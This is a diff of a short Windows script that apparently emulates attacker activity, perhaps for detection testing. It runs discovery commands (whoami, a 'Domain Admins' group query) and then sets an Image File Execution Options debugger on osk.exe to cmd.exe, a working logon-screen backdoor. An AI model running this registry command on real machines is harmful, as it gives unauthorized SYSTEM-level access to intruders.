@@ -2,7 +2,7 @@ cmd.exe /c "whoami"
 Start-Sleep -s 2
 cmd.exe /c "ping -n 1 8.8.8.8"
 Start-Sleep -s 2
-cmd.exe /c "net group "Domain Admins" /domain >> C:\Users\Demo\AppData\Local\Temp\a.txt"
+cmd.exe /c "net group "Domain Admins" /domain
 Start-Sleep -s 2
 cmd.exe /c "reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f"
 Start-Sleep -s 2
